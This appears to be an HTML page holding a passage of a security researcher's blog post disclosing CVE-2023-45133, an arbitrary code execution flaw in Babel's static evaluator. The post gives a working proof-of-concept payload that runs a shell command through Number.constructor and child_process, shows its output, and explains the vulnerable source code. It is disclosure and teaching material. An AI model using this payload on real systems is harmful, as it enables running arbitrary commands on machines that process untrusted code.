

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=dark>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/../images/ico.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="William Khem Marquez">
  <meta name="keywords" content="">
  
    <meta name="description" content="IntroductionOn October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you throug">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel">
<meta property="og:url" content="http://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/index.html">
<meta property="og:site_name" content="ReverseJS">
<meta property="og:description" content="IntroductionOn October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in Babel, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you throug">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/success.jpg">
<meta property="article:published_time" content="2023-10-12T02:35:00.000Z">
<meta property="article:modified_time" content="2023-10-18T12:13:57.732Z">
<meta property="article:author" content="William Khem Marquez">
<meta property="article:tag" content="Javascript">
<meta property="article:tag" content="Babel">
<meta property="article:tag" content="Reverse Engineering">
<meta property="article:tag" content="Exploitation">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://steakenthusiast.github.io/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/success.jpg">
  
  
  
  <title>CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel-ReverseJS</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"steakenthusiast.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":40,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>ReverseJS</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" target="_blank" rel="noopener" href="https://github.com/SteakEnthusiast">
                <i class="iconfont icon-github-fill"></i>
                <span></span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" target="_blank" rel="noopener" href="https://www.linkedin.com/in/william-khem-marquez-3232b9222/">
                <i class="iconfont icon-linkedin-fill"></i>
                <span></span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/../images/background.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-10-11 22:35" pubdate>
          October 11, 2023 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    

    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">CVE-2023-45133: Finding an Arbitrary Code Execution Vulnerability In Babel</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>On October 10th, 2023, I stumbled upon an arbitrary code execution vulnerability in <a target="_blank" rel="noopener" href="https://github.com/babel/babel/">Babel</a>, which was subsequently assigned the identifier CVE-2023-45133. In this post, I’ll walk you through the journey of discovering and exploiting this intriguing flaw.</p>
<p>Those who use Babel for reverse engineering&#x2F;code deobfuscation love using Babel because of all of the built in functionality it provides. One of the most useful features is the ability to statically evaluate expressions using <code>path.evaluate()</code> and <code>path.evaluateTruthy()</code>. I have written about this in the previous articles:</p>
<ul>
<li><p><a href="https://steakenthusiast.github.io/2022/05/28/Deobfuscating-Javascript-via-AST-Manipulation-Constant-Folding/">Constant Folding</a></p>
</li>
<li><p><a href="https://steakenthusiast.github.io/2022/06/14/Deobfuscating-Javascript-via-AST-Deobfuscating-a-Peculiar-JSFuck-style-Case/">A Peculiar JSFuck-style Case</a></p>
</li>
</ul>
<p>Wait, did I say <em>statically evaluate</em>?</p>
<h1 id="The-Exploit"><a href="#The-Exploit" class="headerlink" title="The Exploit"></a>The Exploit</h1><p>Before delving into the details, let’s take a look at the proof of concept I came up with:</p>
<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@babel/parser&quot;</span>);<br><span class="hljs-keyword">const</span> traverse = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@babel/traverse&quot;</span>).<span class="hljs-property">default</span>;<br><br><span class="hljs-keyword">const</span> source = <span class="hljs-string">`String(&#123;  toString: Number.constructor(&quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;id&#x27;).toString())&quot;)&#125;);`</span><br><br><span class="hljs-keyword">const</span> ast = parser.<span class="hljs-title function_">parse</span>(source);<br><br><span class="hljs-keyword">const</span> evalVisitor = &#123;<br>  <span class="hljs-title class_">Expression</span>(path) &#123;<br>    path.evaluate();<br>  &#125;,<br>&#125;;<br><br><span class="hljs-title function_">traverse</span>(ast, evalVisitor);<br></code></pre></td></tr></table></figure>

<p>This simply outputs the result of the <code>id</code> command to the terminal, as can be seen below.</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿kali)-[~/Babel RCE]<br>└─$ node exploit.js<br><span class="hljs-attribute">uid</span>=1000(kali) <span class="hljs-attribute">gid</span>=1000(kali) <span class="hljs-attribute">groups</span>=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),115(scanner),138(wireshark),141(kaboxer),142(vboxsf)<br></code></pre></td></tr></table></figure>

<p>Of course, the payload can be adapted to do anything, such as exfiltrate data or spawn a reverse shell.</p>
<p><img src="/2023/10/11/CVE-2023-45133-Finding-an-Arbitrary-Code-Execution-Vulnerability-In-Babel/success.jpg" srcset="/img/loading.gif" lazyload alt="😁"></p>
<h2 id="Exploit-Breakdown"><a href="#Exploit-Breakdown" class="headerlink" title="Exploit Breakdown"></a>Exploit Breakdown</h2><p>To understand why this vulnerability works, we need to understand the source code of the culprit function, <code>evaluate</code>. The source code of <code>babel-traverse/src/path/evaluation.ts</code> prior to the fix is archived <a target="_blank" rel="noopener" href="https://github.com/babel/babel/blob/7e198e5959b18373db3936fa3223c0811cebfac1/packages/babel-traverse/src/path/evaluation.ts">here</a></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs ts"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Walk the input `node` and statically evaluate it.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Returns an object in the form `&#123; confident, value, deopt &#125;`. `confident`</span><br><span class="hljs-comment"> * indicates whether or not we had to drop out of evaluating the expression</span><br><span class="hljs-comment"> * because of hitting an unknown node that we couldn&#x27;t confidently find the</span><br><span class="hljs-comment"> * value of, in which case `deopt` is the path of said node.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Example:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   t.evaluate(parse(&quot;5 + 5&quot;)) // &#123; confident: true, value: 10 &#125;</span><br><span class="hljs-comment"> *   t.evaluate(parse(&quot;!true&quot;)) // &#123; confident: true, value: false &#125;</span><br><span class="hljs-comment"> *   t.evaluate(parse(&quot;foo + foo&quot;)) // &#123; confident: false, value: undefined, deopt: NodePath &#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params"><span class="hljs-variable language_">this</span>: NodePath</span>): &#123;<br>  <span class="hljs-attr">confident</span>: <span class="hljs-built_in">boolean</span>;<br>  <span class="hljs-attr">value</span>: <span class="hljs-built_in">any</span>;<br>  deopt?: <span class="hljs-title class_">NodePath</span>;<br>&#125; &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-attr">state</span>: <span class="hljs-title class_">State</span> = &#123;<br>    <span class="hljs-attr">confident</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">deoptPath</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">seen</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(),<br>  &#125;;<br>  <span class="hljs-keyword">let</span> value = evaluateCached(<span class="hljs-variable language_">this</span>, state);<br>  <span class="hljs-keyword">if</span> (!state.<span class="hljs-property">confident</span>) value = <span class="hljs-literal">undefined</span>;<br><br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">confident</span>: state.<span class="hljs-property">confident</span>,<br>    <span class="hljs-attr">deopt</span>: state.<span class="hljs-property">deoptPath</span>,<br>    <span class="hljs-attr">value</span>: value,<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>When <code>evaluate</code> is called on a NodePath, it goes through the <code>evaluatedCached</code> wrapper, before reaching the <code>_evaluate</code> function which does all the heavy lifting. The <code>_evaluate</code> function is where the vulnerability lies.</p>
<p>This function is responsible for recursively breaking down AST nodes until it reaches an atomic operation that can be evaluated confidently. The majority of the base cases are evaluated for atomic operations only (such as for binary expressions between two literals). However, there are a few exceptions to this rule.</p>
<p>The two pieces of the source code we care about are the handling of <strong>call expressions</strong> and <strong>object expressions</strong>, as shown below:</p>
<h3 id="Vulnerable-Source-Code"><a href="#Vulnerable-Source-Code" class="headerlink" title="Vulnerable Source Code"></a>Vulnerable Source Code</h3><details>
<summary>Relevant _evaluate source code</summary>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VALID_OBJECT_CALLEES</span> = [<span class="hljs-string">&quot;Number&quot;</span>, <span class="hljs-string">&quot;String&quot;</span>, <span class="hljs-string">&quot;Math&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">VALID_IDENTIFIER_CALLEES</span> = [<br>  <span class="hljs-string">&quot;isFinite&quot;</span>,<br>  <span class="hljs-string">&quot;isNaN&quot;</span>,<br>  <span class="hljs-string">&quot;parseFloat&quot;</span>,<br>  <span class="hljs-string">&quot;parseInt&quot;</span>,<br>  <span class="hljs-string">&quot;decodeURI&quot;</span>,<br>  <span class="hljs-string">&quot;decodeURIComponent&quot;</span>,<br>  <span class="hljs-string">&quot;encodeURI&quot;</span>,<br>  <span class="hljs-string">&quot;encodeURIComponent&quot;</span>,<br>  process.<span class="hljs-property">env</span>.<span class="hljs-property">BABEL_8_BREAKING</span> ? <span class="hljs-string">&quot;btoa&quot;</span> : <span class="hljs-literal">null</span>,<br>  process.<span class="hljs-property">env</span>.<span class="hljs-property">BABEL_8_BREAKING</span> ? <span class="hljs-string">&quot;atob&quot;</span> : <span class="hljs-literal">null</span>,<br>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INVALID_METHODS</span> = [<span class="hljs-string">&quot;random&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidObjectCallee</span>(<span class="hljs-params"></span><br><span class="hljs-params">  val: string,</span><br><span class="hljs-params"></span>): val is (<span class="hljs-keyword">typeof</span> <span class="hljs-variable constant_">VALID_OBJECT_CALLEES</span>)[number] &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">VALID_OBJECT_CALLEES</span>.<span class="hljs-title function_">includes</span>(<br>    <span class="hljs-comment">// @ts-expect-error val is a string</span><br>    val,<br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isValidIdentifierCallee</span>(<span class="hljs-params"></span><br><span class="hljs-params">  val: string,</span><br><span class="hljs-params"></span>): val is (<span class="hljs-keyword">typeof</span> <span class="hljs-variable constant_">VALID_IDENTIFIER_CALLEES</span>)[number] &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">VALID_IDENTIFIER_CALLEES</span>.<span class="hljs-title function_">includes</span>(<br>    <span class="hljs-comment">// @ts-expect-error val is a string</span><br>    val,<br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">isInvalidMethod</span>(<span class="hljs-params">val: string</span>): val is (<span class="hljs-keyword">typeof</span> <span class="hljs-variable constant_">INVALID_METHODS</span>)[number] &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable constant_">INVALID_METHODS</span>.<span class="hljs-title function_">includes</span>(<br>    <span class="hljs-comment">// @ts-expect-error val is a string</span><br>    val,<br>  );<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">_evaluate</span>(<span class="hljs-params">path: NodePath, state: State</span>): any &#123;<br><span class="hljs-comment">/** snip **/</span><br>  <span class="hljs-keyword">if</span> (path.<span class="hljs-title function_">isObjectExpression</span>()) &#123;<br>    <span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>    <span class="hljs-keyword">const</span> props = path.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;properties&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> prop <span class="hljs-keyword">of</span> props) &#123;<br>      <span class="hljs-keyword">if</span> (prop.<span class="hljs-title function_">isObjectMethod</span>() || prop.<span class="hljs-title function_">isSpreadElement</span>()) &#123;<br>        <span class="hljs-title function_">deopt</span>(prop, state);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      <span class="hljs-keyword">const</span> keyPath = (prop <span class="hljs-keyword">as</span> <span class="hljs-title class_">NodePath</span>&lt;t.<span class="hljs-property">ObjectProperty</span>&gt;).<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;key&quot;</span>);<br>      <span class="hljs-keyword">let</span> key;<br>      <span class="hljs-comment">// @ts-expect-error todo(flow-&gt;ts): type refinement issues ObjectMethod and SpreadElement somehow not excluded</span><br>      <span class="hljs-keyword">if</span> (prop.<span class="hljs-property">node</span>.<span class="hljs-property">computed</span>) &#123;<br>        key = keyPath.evaluate();<br>        <span class="hljs-keyword">if</span> (!key.<span class="hljs-property">confident</span>) &#123;<br>          <span class="hljs-title function_">deopt</span>(key.<span class="hljs-property">deopt</span>, state);<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<br>        key = key.<span class="hljs-property">value</span>;<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (keyPath.<span class="hljs-title function_">isIdentifier</span>()) &#123;<br>        key = keyPath.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        key = (<br>          keyPath.<span class="hljs-property">node</span> <span class="hljs-keyword">as</span> t.<span class="hljs-property">StringLiteral</span> | t.<span class="hljs-property">NumericLiteral</span> | t.<span class="hljs-property">BigIntLiteral</span><br>        ).<span class="hljs-property">value</span>;<br>      &#125;<br>      <span class="hljs-keyword">const</span> valuePath = (prop <span class="hljs-keyword">as</span> <span class="hljs-title class_">NodePath</span>&lt;t.<span class="hljs-property">ObjectProperty</span>&gt;).<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>      <span class="hljs-keyword">let</span> value = valuePath.evaluate();<br>      <span class="hljs-keyword">if</span> (!value.<span class="hljs-property">confident</span>) &#123;<br>        <span class="hljs-title function_">deopt</span>(value.<span class="hljs-property">deopt</span>, state);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      value = value.<span class="hljs-property">value</span>;<br>      <span class="hljs-comment">// @ts-expect-error key is any type</span><br>      obj[key] = value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> obj;<br>  &#125;<br><br>  <span class="hljs-comment">/** snip **/</span><br>  <span class="hljs-keyword">if</span> (path.<span class="hljs-title function_">isCallExpression</span>()) &#123;<br>    <span class="hljs-keyword">const</span> callee = path.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;callee&quot;</span>);<br>    <span class="hljs-keyword">let</span> context;<br>    <span class="hljs-keyword">let</span> func;<br><br>    <span class="hljs-comment">// Number(1);</span><br>    <span class="hljs-keyword">if</span> (<br>      callee.<span class="hljs-title function_">isIdentifier</span>() &amp;&amp;<br>      !path.<span class="hljs-property">scope</span>.<span class="hljs-title function_">getBinding</span>(callee.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>) &amp;&amp;<br>      (<span class="hljs-title function_">isValidObjectCallee</span>(callee.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>) ||<br>        <span class="hljs-title function_">isValidIdentifierCallee</span>(callee.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>))<br>    ) &#123;<br>      func = <span class="hljs-variable language_">global</span>[callee.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (callee.<span class="hljs-title function_">isMemberExpression</span>()) &#123;<br>      <span class="hljs-keyword">const</span> object = callee.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;object&quot;</span>);<br>      <span class="hljs-keyword">const</span> property = callee.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;property&quot;</span>);<br><br>      <span class="hljs-comment">// Math.min(1, 2)</span><br>      <span class="hljs-keyword">if</span> (<br>        object.<span class="hljs-title function_">isIdentifier</span>() &amp;&amp;<br>        property.<span class="hljs-title function_">isIdentifier</span>() &amp;&amp;<br>        <span class="hljs-title function_">isValidObjectCallee</span>(object.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>) &amp;&amp;<br>        !<span class="hljs-title function_">isInvalidMethod</span>(property.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>)<br>      ) &#123;<br>        context = <span class="hljs-variable language_">global</span>[object.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>        <span class="hljs-comment">// @ts-expect-error property may not exist in context object</span><br>        func = context[property.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>      &#125;<br><br>      <span class="hljs-comment">// &quot;abc&quot;.charCodeAt(4)</span><br>      <span class="hljs-keyword">if</span> (object.<span class="hljs-title function_">isLiteral</span>() &amp;&amp; property.<span class="hljs-title function_">isIdentifier</span>()) &#123;<br>        <span class="hljs-comment">// @ts-expect-error todo(flow-&gt;ts): consider checking ast node type instead of value type (StringLiteral and NumberLiteral)</span><br>        <span class="hljs-keyword">const</span> type = <span class="hljs-keyword">typeof</span> object.<span class="hljs-property">node</span>.<span class="hljs-property">value</span>;<br>        <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&quot;string&quot;</span> || type === <span class="hljs-string">&quot;number&quot;</span>) &#123;<br>          <span class="hljs-comment">// @ts-expect-error todo(flow-&gt;ts): consider checking ast node type instead of value type</span><br>          context = object.<span class="hljs-property">node</span>.<span class="hljs-property">value</span>;<br>          func = context[property.<span class="hljs-property">node</span>.<span class="hljs-property">name</span>];<br>        &#125;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (func) &#123;<br>      <span class="hljs-keyword">const</span> args = path<br>        .<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;arguments&quot;</span>)<br>        .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">arg</span>) =&gt;</span> evaluateCached(arg, state));<br>      <span class="hljs-keyword">if</span> (!state.<span class="hljs-property">confident</span>) <span class="hljs-keyword">return</span>;<br><br>      <span class="hljs-keyword">return</span> func.<span class="hljs-title function_">apply</span>(context, args);<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">/** snip **/</span><br>&#125;<br><br></code></pre></td></tr></table></figure>
</details>

<h3 id="Handling-of-Call-Expressions"><a href="#Handling-of-Call-Expressions" class="headerlink" title="Handling of Call Expressions"></a>Handling of Call Expressions</h3><p>The first thing to understand is that while call expressions can indeed be evaluated, they are subject to a whitelist check, relying on the <code>VALID_OBJECT_CALLEES</code> or <code>VALID_IDENTIFIER_CALLEES</code> arrays.</p>
<p>Additionally, there are three cases for handling call expressions:</p>
<ol>
<li>When the callee is an identifier, and the identifier is whitelisted in <code>VALID_OBJECT_CALLEES</code> or <code>VALID_IDENTIFIER_CALLEES</code>.</li>
<li>When the callee is a member expression, the object is an identifier, the identifier is whitelisted in <code>VALID_OBJECT_CALLEES</code>, and the property is not blacklisted in <code>INVALID_METHODS</code>.</li>
